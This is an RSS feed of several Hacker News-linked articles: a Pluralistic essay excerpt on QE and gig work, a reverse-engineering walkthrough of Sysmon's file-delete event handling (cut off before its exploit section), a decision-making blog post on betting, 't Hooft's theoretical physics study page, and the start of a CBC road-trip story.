<p><a href="https://www.marketwatch.com/story/without-qe-the-s-p-500-would-be-trading-closer-to-1-800-than-3-300-says-societe-generale-11604688442">https://www.marketwatch.com/story/without-qe-the-s-p-500-would-be-trading-closer-to-1-800-than-3-300-says-societe-generale-11604688442</a></p>
<p>Top-down bailouts have multiplier effects. The banks are made whole, then they get to steal our houses, then they get to steal our rents, then they get to goose their share prices.</p>
<p>This is how the super-rich got even richer, before and after the pandemic. It's also why the tiny minority of Americans with adequate retirement savings saw them swell – it's another spillover effect of the great upward transfer of national wealth.</p>
<p>Why does all of this matter now? Well, between my writing my first paragraph and this one, Biden was declared, giving us what the Biden campaign signalled would be "Obama's third term."</p>
<p>Biden's taking office amidst a financial crisis that's far worse than 2008.</p>
<p>Biden has a long track-record of giving legislative gifts to the finance sector at the expense of the American people. They called him "The Senator from MNBA" for a reason.</p>
<p><a href="https://www.gq.com/story/joe-biden-bankruptcy-bill">https://www.gq.com/story/joe-biden-bankruptcy-bill</a></p>
<p>If he addresses this crisis the same way that he did in 2008 – the way that Congress and the Senate addressed the crisis in 2020 – by bailing out finance, not the public, we're seriously fucked.</p>
<p>Sure, the stock market will continue to rise and rise, as will house prices.</p>
<p>If you are in the 1%, you will get SO MUCH richer. If you're in the 10%, your retirement savings will swell, your mortgage will get cheaper, and your house's value will go up.</p>
<p>For everyone else: evictions, foreclosures, soaring rents, worse wages.</p>
<p>Last week, California voters passed Prop 22, safeguarding the right of gig economy companies to misclassify their workers as contractors and pay them sub-minimum wages, withhold benefits, evade payroll and unemployment taxes, etc.</p>
<p>Uber/Lyft spent $200m to secure that win.</p>
<p>As Prop 22's promoters remind us: Gig work is the new unemployment benefit: it's a private-sector jobs guarantee, work you can get at the tap of your screen. It's a perfect labor market – workers effectively bid to offer the best price to perform servant work for others.</p>
<p>The more workers there are, and the more desperate their situation is, the lower the payments go. A lot of those savings are siphoned off by the (money-losing, stock-soaring) gig companies, but some of it is passed onto customers.</p>
<p>This is by design.</p>
<p>Since the Reagan years, neoliberal regulators and lawmakers have hewed to a radical anti-monopoly theory called "consumer harm." Under "consumer harm," monopolies are only a problem if they drive up prices.</p>
<p>Since gig companies lower prices, they are totally kosher – even if they secure monopolies through predatory pricing.</p>
<p>But there's an even more insidious side to "consumer harm" and the gig economy.</p>
<p>Misclassifying workers as independent contractors converts a brutally exploited workforce into a collection of "small businesses." If they get together and demand higher wages, THEY violate the consumer harm standard. They're a group of companies fixing prices!</p>
<p>We're 12 years into the QE experiment and it has demonstrated the relationship between government money-creation and inflation: inflation isn't the result of government spending, it's the result of government spending that leads to bidding wars.</p>
<p>Giving trillion to the rich created inflation in the things that rich people buy: our houses (out from under us) and stocks.</p>
<p>Now, imagine what a People's Bailout could do.</p>
<p>Imagine replacing the gig economy job guarantee (a workfare program with no workplace protections, job security or minimum wage) with an actual Job Guarantee as described by the economist Pavlina Tcherneva:</p>
<p><a href="https://pluralistic.net/2020/05/05/the-hard-stuff/#jobs-guarantee">https://pluralistic.net/2020/05/05/the-hard-stuff/#jobs-guarantee</a></p>
<p>Federally funded, locally administered: good jobs at inclusive wages that served community needs proposed by community groups and approved by local governments.</p>
<p>Would that be inflationary? Recall that inflation is what happens when the number of buyers goes up and the supply of things they're buying doesn't keep up. Inflation is the result of bidding wars.</p>
<p>For a jobs guarantee to be inflationary, there would have to be a bidding war for the US workforce. That is the opposite of what we have now.</p>
<p><img src="https://i0.wp.com/craphound.com/images/00-jobs-2.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/00-jobs-2.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p><a href="https://wolfstreet.com/2020/11/06/picture-emerges-of-a-weird-recovery-to-still-historically-awful-levels/">https://wolfstreet.com/2020/11/06/picture-emerges-of-a-weird-recovery-to-still-historically-awful-levels/</a></p>
<p>The reason no one wants to buy Americans' labor is that no one has any money to buy the things Americans make with their labor. The only people with money – the wealthy – primarily buy our homes out from under us, and stocks.</p>
<p>QE for the wealthy has made the economy incredibly perverse. Productive companies are being driven to bankruptcy by gig economy companies that lose money. Millions of workers compete to provide services for the lucky few, for dwindling wages.</p>
<p>Workers can't afford to buy stuff so companies have no reason to make stuff and so they become finance grifts, until they collapse, like Hertz did (after it converted itself from a …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2020/11/07/obamas-third-term/#peoplesbailout">https://pluralistic.net/2020/11/07/obamas-third-term/#peoplesbailout</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2020/11/07/obamas-third-term/#peoplesbailout</link>
            <guid isPermaLink="false">hacker-news-small-sites-25019106</guid>
            <pubDate>Sat, 07 Nov 2020 20:44:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sysmon Internals – From File Delete Event to Kernel Code Execution]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25018962">thread link</a>) | @blopeur
<br/>
November 7, 2020 | https://undev.ninja/sysmon-internals-from-file-delete-event-to-kernel-code-execution/ | <a href="https://web.archive.org/web/*/https://undev.ninja/sysmon-internals-from-file-delete-event-to-kernel-code-execution/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>On April 2020, Mark Russinovich announced the release of a new event type for Sysmon version 11.0: event ID 23, File Delete. As indicated by the name, it logs file delete events that occur on the system. In addition to this, another functionality came alongside allowing files marked for deletion to be archived, enabling defenders to track tools being dropped by malware to better understand the actor's capabilities and develop signatures. This article will discuss the internals of Sysmon version 11.11's to gain insight into how it operates and its limitations. I have briefly checked Sysmon version 12.0 as it was released (September 17, 2020) during the writing of this article and the code for this event looks almost identical so the information should still be mostly relevant.</p><p>Before beginning the article, a huge thank you to <a href="https://twitter.com/SBousseaden">Samir</a> for the collaborative effort on this journey.</p><p>Let's first understand the conditions for which the file delete event will be triggered. The file events are handled almost entirely by the <code>SysmonDrv.sys</code> driver through the minifilter component. Specifically, it monitors for three I/O request packets (IRP) <code>IRP_MJ_CREATE</code>, <code>IRP_MJ_CLEANUP</code>, and <code>IRP_MJ_WRITE</code> for file creates, complete handle closes (reference count on a file object reaching zero), and writes respectively.</p><h2 id="irp_mj_create">IRP_MJ_CREATE</h2><p>The purpose of this IRP in the context of file deletes is to handle two situations: file overwrites and file deletes using the <code>FLAG_FILE_DELETE_ON_CLOSE</code> option.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-1.png"><figcaption>File overwrite versus <code>FLAG_FILE_DELETE_ON_CLOSE</code></figcaption></figure><p>Sysmon will check first whether the file was opened with <code>FLAG_FILE_DELETE_ON_CLOSE</code>, and if it is, the configuration's filter rules will be matched against. If the conditions are met, the delete event will be created and the file will be archived in the <code>IRP_MJ_CLEANUP</code> request when all the handles to the file are closed.</p><p>On the other hand, if the file already exists and is being opened with overwrite intent (disposition value is either <code>FILE_OVERWRITE</code> or <code>FILE_OVERWRITE_IF</code>), the driver will attempt to open the file with <code>FltCreateFile</code>. If the function fails with <code>STATUS_OBJECT_NAME_NOT_FOUND</code>, the file doesn't exist and Sysmon will pass it on to be handled as a file create event. Otherwise, if it returns successfully, the target file exists and will be archived immediately, creating the delete event in tandem.</p><h2 id="irp_mj_cleanup">IRP_MJ_CLEANUP</h2><p>As mentioned before, this request is sent when all of the referenced handles to a file have been closed. Sysmon handles this request by checking the <code>DeletePending</code> flag in the file object and archiving the file if it's set. In the case of <code>FLAG_FILE_DELETE_ON_CLOSE</code>, Sysmon will explicitly set the file's delete disposition to true using <code>FltSetInformationFile</code> with <code>FileDispositionInformation</code> before checking the <code>DeletePending</code> flag.</p><figure><img src="https://undev.ninja/content/images/2020/09/image.png"><figcaption>File is archived if <code>DeletePending</code> is set</figcaption></figure><h2 id="irp_mj_write">IRP_MJ_WRITE</h2><p>Sysmon also considers file content overwrites instead of just classic file deletes. To meet this condition, the write must originate from user mode, the write size must be greater than or equal to the size of the target file and the write should start at the zeroth offset.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-2.png"><figcaption>File write should start at offset 0 and be greater than or equal to the file size</figcaption></figure><p>Sysmon will then read the first byte of the file before iterating through each byte of the buffer that will be written. To trigger the file archiving and delete event, all of the bytes must match the first recorded byte. Sysmon refers to this as <em>shredding</em> where all bytes of the overwrite are the same, e.g. <em>AAAAAAA...</em>. </p><p>There is one more condition under <code>IRP_MJ_WRITE</code> which triggers the archive and delete event however, I was unable to trigger or trace the conditions required. Perhaps this would be an upcoming feature?</p><p>Now that the conditions of file delete events have been covered, let's investigate the implementation details.</p><h2 id="file-delete-requirements">File Delete Requirements</h2><p>The first function to cover is one I call <code>CheckAndQueueFileDeleteEvent</code> and its main purpose is to check if the target file should be archived and if a delete event should be logged. It achieves this in several ways with a few initial checks. If any of the following conditions are met, the file delete event will be bypassed:</p><ol><li>The operation is made by the registered service process (should be <code>Sysmon64.exe</code>),</li><li>The delete event was not set in the configuration,</li><li>The target file is a device or directory,</li><li>The file is empty,</li><li>The file's parent directory is the archive directory.</li></ol><p>After these initial checks, the function will retrieve the file's extension using <code>FltParseFileNameInformation</code> and also check if the file is an executable by using a few <code>FltReadFile</code> calls to read the <code>MZ</code> and <code>PE</code> signatures at offset 0 and <code>0x3C</code> respectively. These values are returned back to the caller along with the image file name responsible for the operation.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-3.png"><figcaption>Checking for PE executable signatures</figcaption></figure><p>Finally, it makes a call to a function I labelled <code>QueueFileDeleteEvent</code> to perform a final check if the file should be archived and logged. </p><h2 id="reporting-file-delete-events">Reporting File Delete Events</h2><p>The following represents the proprietary file delete event structure:</p><figure><pre><code>typedef struct _FILE_DELETE_EVENT {
	/*   0 */ ULONG Id;          // 0xF0000000 for file delete.
	/*   4 */ ULONG Size;        // Struct size.
	/*   8 */ PVOID Unk1;
	/*  10 */ PVOID Unk2;
	/*  18 */ HANDLE ProcessHandle;
	/*  20 */ PKSYSTEM_TIME SystemUtcTime;
	/*  28 */ ULONG HashMethod;
	/*  2C */ BOOLEAN IsExecutable;
	/*  30 */ ULONG SidLength;
	/*  34 */ ULONG ObjectNameLength;
	/*  38 */ ULONG ImageFileNameLength;
	/*  3C */ ULONG HashLength;
	/*  40 */ WCHAR StatusString[256];
	/* 240 */ PEPROCESS ServiceProcessHandle;	// Actually a PEPROCESS object.
	/* 248 */ PKEVENT Event;
	/* 250 */ PBOOLEAN IsArchivedAddress;
	/* 258 */ // User SID.
	/* xxx */ // Object name.
	/* xxx */ // Image file name.
	/* xxx */ // File hash.
} FILE_DELETE_EVENT, * PFILE_DELETE_EVENT;</code></pre><figcaption>File delete event structure</figcaption></figure><p>The event is allocated and set in <code>QueueFileDeleteEvent</code>. But besides the obvious purpose of reporting file delete event data, it has another important, secondary purpose. The tenth argument to this function is a pointer that represents the boolean value of whether the target file should be archived. Although this pointer is optional, if it is a valid, non-zero value, this function serves to pass the event data to <code>Sysmon64.exe</code> via an event queue to be checked against the filter conditions provided in the configuration file.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-4.png"><figcaption>Valid tenth argument</figcaption></figure><p>This explains the existence of the <code>Event</code>, <code>IsArchivedAddress</code>, and the <code>ServiceProcessHandle</code> members of the <code>FILE_DELETE_EVENT</code> structure. After intialising these values and the structure, the event is queued in a function I labelled <code>QueueEvent</code> and the thread is blocked using <code>KeWaitForMultipleObjects</code> waiting on either the <code>Event</code> or the <code>Sysmon64.exe</code> process.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-5.png"><figcaption>Thread blocking after queuing file delete event</figcaption></figure><p>To understand this further, we need to know how events are reported from the driver to <code>Sysmon64.exe</code>.</p><h3 id="queueevent">QueueEvent</h3><p>Sysmon utilises a doubly linked list to queue up events. In this article, I will refer to it as <code>g_EventReportList</code>. This function is relatively straightforward, if the event size is not greater than <code>0x3FCB8 + 0x348</code> (40000) it will be appended to <code>g_EventReportList</code>, otherwise, an incorrect event size error will be created. Since we are not concerned about the error event, we'll skip it for brevity.</p><p>An allocation for a new data structure is created to wrap the event argument:</p><pre><code>typedef struct _EVENT_REPORT {
    /*  0 */ LIST_ENTRY ListEntry;
    /* 10 */ ULONG EventDataSize;
    /* 18 */ PVOID EventData;
} EVENT_REPORT, *PEVENT_REPORT;</code></pre><p>The pointer to the event is pointed to by <code>EventData</code> and its size is stored in <code>EventDataSize</code>. After filling this structure, the <code>EVENT_REPORT</code> is appended in <code>g_EventReportList</code> if the number of entries is less than 50000. If there are 50000 entries, the first item in the queue is removed and deallocated.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-10.png"><figcaption>Allocating and appending new event to <code>g_EventReportList</code></figcaption></figure><h3 id="retrieving-events">Retrieving Events</h3><p>Once events are queued, <code>Sysmon64.exe</code> can read them one by one through the driver's device control dispatch with the I/O control code <code>0x83400004</code>.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-11.png"><figcaption>Reading the first event on the queue through the device control dispatch</figcaption></figure><p>In the context of the file delete event, <code>Sysmon64.exe</code> will check for a valid <code>Event</code> member.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-12.png"><figcaption><code>Sysmon64.exe</code> checking for valid <code>Event</code> member</figcaption></figure><p>If it's valid, a filter check will be performed to determine if the target file object should be archived and a file delete event launched. The following data structure will be initialised and sent to the driver:</p><pre><code>typedef struct _SET_ARCHIVED_INFO {
    /*  0 */ BOOLEAN IsArchived;
    /*  8 */ PEPROCESS ServiceProcessHandle;	// Service process.
    /* 10 */ PKEVENT Event;
    /* 18 */ PBOOLEAN IsArchivedAddress;
} SET_ARCHIVED_INFO, *PSET_ARCHIVED_INFO;</code></pre><p>The <code>IsArchived</code> value is set depending on the return value of the function that checks for filter matching. Using <code>DeviceIoControl</code>, Sysmon will send the above structure back to the driver with the <code>0x83400010</code> I/O control code.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-14.png"><figcaption><code>Sysmon64.exe</code> responding with whether the file should be logged</figcaption></figure><p>Back in the driver's device control dispatch, the value in <code>IsArchivedAddress</code> will be set to <code>IsArchived</code> (!) before signalling the event to unblock <code>QueueFileDeleteEvent</code>.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-15.png"><figcaption>Device control dispatch setting <code>IsArchived</code> value and signalling <code>QueueFileDeleteEvent</code>'s wait</figcaption></figure><p>Once <code>QueueFileDeleteEvent</code> is signalled and unblocked, it will return the <code>IsArchived</code> value back through the tenth argument which is then returned again from <code>CheckAndQueueFileDeleteEvent</code>.</p><p>The return value is used in two locations: the <code>IRP_MJ_CREATE</code> with <code>FLAG_FILE_DELETE_ON_CLOSE</code> and in the <code>ArchiveFile</code> function. The former triggers the file delete event and archiving in the <code>IRP_MJ_CLEANUP</code> request by setting the <code>CompletionContext</code> value to <code>1</code> so that it can be handled in the minifilter's post operation.</p><figure><img src="https://undev.ninja/content/images/2020/09/image-16.png"><figcaption>Notifying post operation to handle <code>FLAG_FILE_DELETE_ON_CLOSE</code> files</figcaption></figure><p>The post operation routine simply allocates and sets a …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://undev.ninja/sysmon-internals-from-file-delete-event-to-kernel-code-execution/">https://undev.ninja/sysmon-internals-from-file-delete-event-to-kernel-code-execution/</a></em></p>]]>
            </description>
            <link>https://undev.ninja/sysmon-internals-from-file-delete-event-to-kernel-code-execution/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25018962</guid>
            <pubDate>Sat, 07 Nov 2020 20:31:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Embrace Uncertainty and Risk Something (How to Bet)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25018370">thread link</a>) | @salakotolu
<br/>
November 7, 2020 | https://tolusnotes.com/how-to-bet-1/ | <a href="https://web.archive.org/web/*/https://tolusnotes.com/how-to-bet-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<main>
<article>

<div>
<p>Over the next few weeks (maybe months — blame my vacation), I plan to focus on decision making. It's a subject I'm passionate about because it was life-changing from the moment I started paying attention to it. Not only in my financial life (this is a financial blog) but also in my career and my relationships. My goal here is to (hopefully) introduce you to some new concepts, and get you excited about making decisions. You won't learn it all here. I'll link additional books and resources that can help you further your understanding at the bottom of each post. As always, reply to the newsletter or email me if you have questions.</p><hr><p>Every decision you make is a bet. Saying yes to something is betting on the future you expect by making that choice. Similarly, you're betting against the alternate realities where you provided a different answer. Not all decisions require contemplating. Ice-cream or no ice-cream, for example, won't result in drastically different futures. Not unless your potential soulmate is the one selling the ice-cream. It's not all deep, but sometimes it is. Some of the 'small' decisions I made in the past turned out to be huge leaps in retrospect. Like me, you won't know it at the time. But hindsight is twenty-twenty, therefore it's important to make fewer bad decisions.</p><hr><p>Annie Duke's <a href="https://amzn.to/3jCpX5E"><em>Thinking in Bets</em></a> has arguably had the most influence on how I view odds. The book tries to help you make smarter decisions when you do not have all the facts. It is one of the few books I continue to recommend — I've read it more than once (this is rare). Let's say you're having an ardent conversation with a friend about who will be the NBA Finals MVP. You could continue to go back and forth for hours or you could ask them: <strong><em>Wanna Bet?</em></strong> It's a simple and effective way to cut an argument like this one short. Talk is cheap (monetarily and mentally). Anyone can say anything as long as there's nothing to lose. The bet only gets interesting if something valuable is at risk. It could be money, reputation, or a future favor.</p><h3 id="wanna-bet">Wanna Bet?</h3><p>Consider the following statement: <em>LeBron will definitely be the NBA finals MVP next year</em>. Play along here; forget how you feel about James and the Lakers for a few minutes. It doesn't cost you anything to be wrong, therefore uttering that statement didn't require any critical thinking. But what if something is at stake? How much between $100 and $10,000 would you be willing to bet on your position? There's a good chance you'd want to take a step back to evaluate the odds. Maybe you are not $10,000 sure, but you are sure enough to bet $100.</p><p>If you're still willing to bet $10,000, you either don't value the money, or you have some hidden information about the outcome of the NBA season and the fate of its athletes. But what if you don't have all the facts? What if, like me, you can't predict the future? How do you approach betting? &nbsp;Now that you're thinking, the statement now reads... <em>LeBron will likely be the NBA finals MVP next year.</em></p><blockquote>We process information to support our beliefs instead of using it to calibrate our beliefs - Annie Duke (Some Podcast)</blockquote><h3 id="calibrate-your-belief">Calibrate Your Belief</h3><p>The chances that LeBron James will be the Finals MVP isn't a yes or a no question. Contrary to how we've been wired in school, most questions can't be answered with true or false. The world is more complicated than that. LeBron James could get injured. The Lakers may not execute as well as they did this season. The season could be postponed due to some unforeseen circumstance like a virus, war, or aliens. Before you finish laughing at the part about aliens, remember that unknown information can have an outsized impact on the outcome of your decisions.</p><blockquote>Remember that the things we don't expect tend to have asymmetric impacts on our lives compared to what we prepare for. This is especially true in a year like 2020, but keep it in mind moving forward.</blockquote><p>Stop thinking in black and white or right and wrong. <strong>You should try thinking in percentages instead.</strong> Sure, the outcome is binary. At the end of the season, LeBron will either have the MVP title or not. But the road to each of those realities isn't as clear. James is going to fall somewhere between the most undeserving player and the most deserving player in the NBA. It's difficult to know for sure because luck plays a big role here. But the answer isn't either 0 or 1, it is somewhere between. Try to calculate the odds by breaking down the statement.</p><ol><li>What are the chances that the Lakers will make the playoffs? Don't ignore the other teams; even 'bad' ones can surprise you.</li><li>What are the chances that they will make the finals? What other teams have a good chance?</li><li>What are the chances that the Lakers win it all?</li><li>What are the chances that LeBron James will be chosen? It could go to another teammate or a player on the losing team. (Rare, but it's happened before)</li></ol><p>If you're interested in how to come up with these parts and how to combine them, I recommend reading <a href="https://amzn.to/3jIbNQj">Superforecasting</a>. It's a great book to start with.</p><p>At the end of this step, the statement should read: <em>I'm 90% sure that LeBron will <s>definitely</s> be the NBA finals MVP next year.</em></p><h3 id="should-you-bet">Should You Bet?</h3><p>Be careful when asking people to bet; it can backfire. Usually, I win stalemates with my girlfriend by asking her to bet on her position. She'd agree, then I'd raise the stake till she backed off. But she caught on quickly. She realized that I was raising the stakes because I wasn't as certain with my odds. She figured out that I was taking advantage of her risk averseness. After that, she flipped the game on me and took whatever amount I presented. She'd smile with her hands drawn to lock in the bet with a handshake no matter how high the stake. I ask her to bet less frequently now after losing a few rounds.</p><p>Money is a weird topic for a lot of people. Personally, I view money differently and believe it should be a casual topic. You probably do too if you're reading this. But most people won't be pleased if you continually ask them to bet. Alternatively, you can shake on it for a chance to be right in the future. Depending on how you view the other participant, this feeling (or vindication) can be more rewarding.</p><p>You can also do this exercise with yourself. No one else has to be included. You can bet yourself how much you'd throw into your retirement account if things don't go your way. The whole point of this is to change your thinking, not to continually ask people (yourself included) 'Wanna Bet?' It's to get you to start questioning your beliefs. Start to consider what the other party knows that you don't. Start wondering why you may be wrong instead of searching for evidence that only supports your position.</p><h2 id="delve-deeper">Delve Deeper</h2><p><a href="https://amzn.to/3jCpX5E"><em>Thinking in Bets</em></a> - Annie Duke<br><a href="https://amzn.to/3jIbNQj">Superforecasting</a> - Philip Tetlock &amp; &nbsp;Dan Gardner<br><a href="https://fs.blog/">Farnam Street Blog &amp; Podcast</a></p><figure><a href="https://tolusnotes.com/how-to-bet-2/"><div><p>Illusion Of Understanding — Know What You Don’t Know (How to Bet #2)</p><p>How to avoid one of the biggest pitfalls in decision making — the illusion of understanding.</p><p><img src="https://tolusnotes.com/favicon.ico"><span>Tolu's Notes</span></p></div><p><img src="https://tolusnotes.com/content/images/2020/11/Blog-Post-1-.png"></p></a></figure><hr><p>
<sub>🎙️ Business and Investing Podcast: <a href="https://bit.ly/tolusnotes-youtube">YouTube</a> | <a href="https://bit.ly/tolusnotes-podcast">Audio Sources</a></sub><br>
<sub>📚 Currently reading <a href="https://amzn.to/34HAp7E">Black Swan - Nassim Taleb</a></sub><br>
<sub>❤️ Support my writing by forwarding it to a friend or family</sub><br>
<sub>👊 If this was forwarded to you, subscribe <a href="https://tolusnotes.com/signup/">here</a> for future notes</sub><br>
<sub>✉️ Thanks for reading. Let me know what you think of it at <a href="https://tolusnotes.com/cdn-cgi/l/email-protection" data-cfemail="5a343f2d29363f2e2e3f281a2e35362f2934352e3f2974393537">[email&nbsp;protected]</a></sub><br>
</p><p><sup>All content provided on this blog is for educational purposes only and should not be taken as personalized investment or tax advice, not as an indication to buy or sell certain securities. The owner of this blog makes no representations as to the accuracy or completeness of any information on this site or found by following any link on this site. The owner will not be liable for any errors or omissions in this information nor for the availability of this information. The owner will not be liable for any losses, injuries, or damages from the display or use of this information.</sup></p>

<section>
<h2>Enjoying these posts? Subscribe for more</h2>

<br>

</section>
</div>

</article> 
</main>
</div>
</div></div>]]>
            </description>
            <link>https://tolusnotes.com/how-to-bet-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25018370</guid>
            <pubDate>Sat, 07 Nov 2020 19:49:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Become a Good Theoretical Physicist]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25017968">thread link</a>) | @part1of2
<br/>
November 7, 2020 | https://webspace.science.uu.nl/~gadda001/goodtheorist/index.html | <a href="https://web.archive.org/web/*/https://webspace.science.uu.nl/~gadda001/goodtheorist/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <!--Sidebar -->
      

     <!--Content -->
     <div>
          
              <div>
          
                      
                      <h4><a href="https://webspace.science.uu.nl/~gadda001/goodtheorist/%7BPermalink%7D"><!--{TimeAgo}--></a></h4>



     

                  
                  <p><b>This is a web site (under construction) for young students - and anyone else - who are (like me) thrilled by the challenges posed by real science, 
                     and who are - like me - determined to use their brains to discover new things about the physical world that we are living in. In short, it is for all 
                     those who decided to study theoretical physics, in their own time.</b></p>

                  <p>It so often happens that I receive mail - well-intended but totally useless - by amateur physicists who believe to have solved the world. They believe this, 
                     only because they understand totally nothing about the real way problems are solved in Modern Physics. If you really want to contribute to our theoretical 
                     understanding of physical laws - and it is an exciting experience if you succeed! - there are many things you need to know. First of all, be serious about 
                     it. All necessary science courses are taught at Universities, so, naturally, the first thing you should do is have yourself admitted at a University and 
                     absorb everything you can. But what if you are still young, at School, and before being admitted at a University, you have to endure the childish anecdotes 
                     that they call science there? What if you are older, and you are not at all looking forward to join those noisy crowds of young students?</p>

                 <p>It should be possible, these days, to collect all knowledge you need from the internet. Problem then is, there is so much junk on the internet. Is it possible 
                    to weed out those very rare pages that may really be of use? I know exactly what should be taught to the beginning student. The names and topics of the absolutely 
                    necessary lecture courses are easy to list, and this is what I have done below. It is my intention to search on the web where the really useful papers and books 
                    are, preferably downloadable as well. This way, the costs of becoming a theoretical physicist should not exceed much the price of a computer with internet connection, 
                    a printer, and lots of paper and pens. Unfortunately, I still have to recommend to buy text books as well, but it is harder to advise you here; perhaps in a future 
                    site. Let’s first limit ourselves to the absolute minimum. The subjects listed below must be studied. Any omission will be punished: failure. Do get me right: you 
                    don’t have to believe anything you read on faith - check it. Try alternative approaches, as many as you can. You will discover, time and again, that really what 
                    those guys did indeed was the smartest thing possible. Amazing. the best of the texts come with exercises. Do them. find out that you can understand everything. 
                    Try to reach the stage that you discover the numerous misprints, tiny mistakes as well as more important errors, and imagine how you would write those texts in a 
                    smarter way.</p>

                <p>I can tell you of my own experiences. I had the extreme luck of having excellent teachers around me. That helps one from running astray. It helped me all the way 
                   to earn a Nobel Prize. But I didn’t have internet. I am going to try to be your teacher. It is a formidable task. I am asking students, colleagues, teachers to 
                   help me improve this site. It is presently set up only for those who wish to become theoretical physicists, not just ordinary ones, but the very best, those who are 
                   fully determined to earn their own Nobel Prize. If you are more modest than that, well, finish those lousy schools first and follow the regular routes provided by 
                   educators and specialized -gogues who are so damn carefully chewing all those tiny portions before feeding them to you. This is a site for ambitious people. I am 
                   sure that anyone can do this, if one is gifted with a certain amount of intelligence, interest and determination. Now, here begins the serious stuff. Don’t complain that 
                   it looks like being a lot. You won’t get your Nobel Prize for free, and remember, all of this together takes our students at least 5 years of intense study (at least 
                   one reader was surprised at this statement, saying that (s)he would never master this in 5 years; indeed, I am addressing people who plan to spend most of their time 
                   to this study). More than rudimentary intelligence is assumed to be present, because ordinary students can master this material only when assisted by patient teachers. 
                   It is necessary to do exercises. Some of the texts come with exercises. Do them, or better, invent your own exercises. Try to outsmart the authors, but please refrain 
                   from mailing to me your alternative theories until you have studied the entire lot; if you do this well you will discover that many of these authors were not so stupid 
                   after all.</p>

               <p>Theoretical Physics is like a sky scraper. It has solid foundations in elementary mathematics and notions of classical (pre-20th century) physics. Don’t think that 
                  pre-20th century physics is “irrelevant” since now we have so much more. In those days, the solid foundations were laid of the knowledge that we enjoy now. Don’t 
                  try to construct your sky scraper without first reconstructing these foundations yourself. The first few floors of our skyscraper consist of advanced mathematical 
                  formalisms that turn the Classical Physics theories into beauties of their own. They are needed if you want to go higher than that. So, next come many of the other 
                  subjects listed below. Finally, if you are mad enough that you want to solve those tremendously perplexing problems of reconciling gravitational physics with the 
                  quantum world, you end up studying general relativity, superstring theory, M-theory, Calabi-Yau compactification and so on. That’s presently the top of the sky 
                  scraper. There are other peaks such as Bose-Einstein condensation, fractional Hall effect, and more. Also good for Nobel Prizes, as the past years have shown. A 
                  warning is called for: even if you are extremely smart, you are still likely to get stuck somewhere. Surf the net yourself. Find more. Tell me about what you found. 
                  If this site has been of any help to someone while preparing for a University study, if this has motivated someone, helped someone along the way, and smoothened his 
                  or her path towards science, then I call this site successful. Please let me know. Here is the list.</p>

              <p>Note that this site NOT meant to be very pedagogical. I avoid texts with lots of colorful but distracting pictures from authors who try hard to be funny. Also, the 
                 subjects included are somewhat focused towards my own interests.</p>

<p>LIST OF SUBJECTS, IN LOGICAL ORDER ARE ON THE SIDE.
(Not everything has to be done in this order, but this approximately indicates the logical coherence of the various subjects. Some notes are at a higher level than others).</p>


           </div>
          

              
              

          

          




     </div><!--bit-75-->
  </div></div>]]>
            </description>
            <link>https://webspace.science.uu.nl/~gadda001/goodtheorist/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25017968</guid>
            <pubDate>Sat, 07 Nov 2020 19:23:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two Maritimers (and one Volvo) became the fastest men around the world]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25017720">thread link</a>) | @goodcanadian
<br/>
November 7, 2020 | https://www.cbc.ca/news/canada/nova-scotia/volvo-around-the-world-maritimers-odyssey-1.5785959 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/nova-scotia/volvo-around-the-world-maritimers-odyssey-1.5785959">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Garry Sowerby and Ken Langley wanted to take a good road trip in the fall of 1980. They decided, why not take the greatest road trip ever and drive right around the world?</p><div><p><span><span><div><div role="button" tabindex="0" title="How two Maritimers (and one Volvo) became the fastest men around the world"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/856/107/ODYSSEY_77_VIDEO_THUMBNAIL_corrected.jpg" alt=""></p></div></div></div><span>It's been 40 years since Garry Sowerby and Ken Langley set a record for circumnavigating the world by car. Their achievement is a unique one because Guinness has since changed the criteria for the category.<!-- --> <!-- -->10:13</span></span></span></p><p><span><p>On a dull day in October 1872, a rich, fictitious, British character named Phileas Fogg read a newspaper article about a new railway opening in India. Now, the newspaper claimed, it was possible to travel around the entire world in just 80 days.</p>  <p>Fogg decided to wager half his fortune that he could become the fastest person to travel around the world. He left London on Oct. 2 and promised to return by Dec. 21 to claim his winnings.</p>  <p>His epic adventure, created by French author Jules Verne in the novel 